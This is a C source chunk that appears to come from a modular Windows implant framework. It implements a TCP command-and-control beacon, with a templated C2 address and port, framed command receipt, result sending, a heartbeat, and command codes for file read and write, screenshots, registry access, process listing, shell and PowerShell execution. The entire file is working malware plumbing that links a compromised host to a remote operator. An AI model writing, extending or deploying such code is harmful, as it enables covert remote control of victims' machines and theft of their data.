// chunk: c2/tcp_beacon
// depends: core/emit_buffer
// provides: c2_hdr_t, g_c2_sock, c2_connect, c2_disconnect, c2_recv_cmd, c2_send_result, c2_heartbeat
// headers: winsock2.h, ws2tcpip.h, stdint.h
// libs: ws2_32
// note: raw TCP bidirectional C2 with TLV framing — reconnect with jitter

#ifndef CHUNK_C2_TCP_BEACON
#define CHUNK_C2_TCP_BEACON

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

#pragma pack(push, 1)
typedef struct { uint32_t cmd_id; uint32_t payload_len; } c2_hdr_t;
#pragma pack(pop)

#define C2_CMD_HEARTBEAT    0x01
#define C2_CMD_SYSINFO      0x02
#define C2_CMD_PROCESSES    0x03
#define C2_CMD_FILELIST     0x04
#define C2_CMD_FILEREAD     0x05
#define C2_CMD_FILEWRITE    0x06
#define C2_CMD_SCREENSHOT   0x07
#define C2_CMD_REGISTRY     0x08
#define C2_CMD_NETINFO      0x09
#define C2_CMD_EXEC         0x0A
#define C2_CMD_EXEC_PS      0x0B
#define C2_CMD_EXIT         0x0D
#define C2_CMD_NOOP         0xFF

static SOCKET g_c2_sock = INVALID_SOCKET;
static int g_wsa_init = 0;

static int c2_recv_exact(void *buf, DWORD len) {
    DWORD got = 0;
    while (got < len) {
        int n = recv(g_c2_sock, (char *)buf + got, (int)(len - got), 0);
        if (n <= 0) return 0;
        got += n;
    }
    return 1;
}

static int c2_send_exact(const void *buf, DWORD len) {
    DWORD sent = 0;
    while (sent < len) {
        DWORD chunk = (len - sent > 32768) ? 32768 : (len - sent);
        int n = send(g_c2_sock, (const char *)buf + sent, (int)chunk, 0);
        if (n <= 0) return 0;
        sent += n;
    }
    return 1;
}

static int c2_connect(const char *ip, int port) {
    if (!g_wsa_init) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
        g_wsa_init = 1;
    }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((WORD)port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        g_c2_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_c2_sock == INVALID_SOCKET) return 0;

        if (connect(g_c2_sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            return 1;

        closesocket(g_c2_sock);
        g_c2_sock = INVALID_SOCKET;
        if (retries > 0) Sleep(2000);
    }
    return 0;
}

static void c2_disconnect(void) {
    if (g_c2_sock != INVALID_SOCKET) {
        closesocket(g_c2_sock);
        g_c2_sock = INVALID_SOCKET;
    }
    if (g_wsa_init) {
        WSACleanup();
        g_wsa_init = 0;
    }
}

static int c2_recv_cmd(c2_hdr_t *hdr, char *payload, DWORD max_len) {
    if (!c2_recv_exact(hdr, sizeof(c2_hdr_t))) return 0;
    if (hdr->payload_len == 0) return 1;
    if (hdr->payload_len > max_len) return 0;
    return c2_recv_exact(payload, hdr->payload_len);
}

static int c2_send_result(uint32_t cmd_id, const char *data, DWORD len) {
    c2_hdr_t hdr;
    hdr.cmd_id = cmd_id;
    hdr.payload_len = len;
    if (!c2_send_exact(&hdr, sizeof(hdr))) return 0;
    if (len > 0 && data) return c2_send_exact(data, len);
    return 1;
}

static int c2_heartbeat(void) {
    DWORD tick = GetTickCount();
    return c2_send_result((uint32_t)C2_CMD_HEARTBEAT, (const char *)&tick, sizeof(tick));
}

#endif
